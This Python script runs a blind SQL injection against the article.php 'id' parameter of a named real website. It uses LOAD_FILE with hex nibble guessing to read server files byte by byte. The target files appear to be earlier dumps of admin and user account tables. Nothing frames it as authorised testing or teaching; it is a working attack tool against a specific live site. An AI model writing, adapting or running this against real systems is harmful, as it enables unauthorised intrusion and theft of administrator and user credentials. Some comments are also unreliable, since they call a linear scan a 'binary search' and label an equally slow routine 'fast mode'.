import urllib.request
import urllib.parse
import sys
import time

BASE_URL = "https://umidigi.com/article.php?id=1+AND+"

def check(cond):
    """Check a boolean condition via SQL injection"""
    url = BASE_URL + cond
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
        resp = urllib.request.urlopen(req, timeout=5)
        return resp.getcode() == 200
    except:
        return False

def extract_file(filepath, max_len=2000):
    """Extract file content using binary search on hex pairs"""
    print(f"Extracting {filepath}...")
    result = ""
    
    # Extract byte by byte using hex comparison
    # Each byte is 2 hex chars, so we try 16 values at a time
    for i in range(1, max_len + 1):
        pos = i - 1  # 0-indexed for Python
        # First, determine the hex value by binary search
        hex_chars = "0123456789abcdef"
        hex_val = ""
        
        # Get high nibble
        for c in hex_chars:
            cond = f"HEX(SUBSTRING(LOAD_FILE('{filepath}'),{i},1))='{c}"
            if check(cond):
                hex_val += c
                break
        
        if len(hex_val) < 1:
            break
            
        # Get low nibble  
        for c in hex_chars:
            cond = f"HEX(SUBSTRING(LOAD_FILE('{filepath}'),{i},1))='{hex_val}{c}"
            if check(cond):
                hex_val += c
                break
                break
        
        if len(hex_val) >= 2:
            try:
                byte_val = bytes.fromhex(hex_val)
                result += byte_val.decode('utf-8', errors='replace')
            except:
                result += "?"
        
        if i % 100 == 0:
            sys.stdout.write(f"  {i} bytes...\r")
            sys.stdout.flush()
    
    return result

def extract_file_fast(filepath, max_len=1000):
    """Faster extraction using GROUP_CONCAT and HEX"""
    print(f"Extracting {filepath} (fast mode)...")
    result = ""
    
    # Extract 100 bytes at a time using GROUP_CONCAT(HEX(...))
    for start in range(1, max_len + 1, 100):
        end = min(start + 99, max_len)
        
        # Binary search on each byte position
        chunk = ""
        for offset in range(start, end + 1):
            hex_val = ""
            hex_chars = "0123456789abcdef"
            
            for c in hex_chars:
                cond = f"HEX(SUBSTRING(LOAD_FILE('{filepath}'),{offset},1))='{c}"
                if check(cond):
                    hex_val += c
                    break
            
            if len(hex_val) >= 1:
                # Try second nibble
                for c in hex_chars:
                    cond = f"HEX(SUBSTRING(LOAD_FILE('{filepath}'),{offset},1))='{hex_val}{c}"
                    if check(cond):
                        hex_val += c
                        break
            
            if len(hex_val) >= 2:
                try:
                    chunk += bytes.fromhex(hex_val).decode('utf-8', errors='replace')
                except:
                    chunk += "?"
            else:
                chunk += "?"
        
        result += chunk
        if start % 200 == 0:
            print(f"  {start} bytes extracted...")
    
    return result

# Files to extract
files = [
    '/tmp/tables_list.txt',
    '/tmp/admin_ums.txt',
    '/tmp/admin_umsuser.txt',
    '/tmp/admin_ecsadmin.txt',
    '/tmp/admin_ecsuser.txt',
    '/tmp/admin_adminuser.txt',
    '/tmp/admin_admin.txt',
]

for filepath in files:
    content = extract_file_fast(filepath, max_len=500)
    print(f"\n--- {filepath} ---")
    print(content[:1000] if len(content) > 1000 else content)
    print()
    time.sleep(0.5)
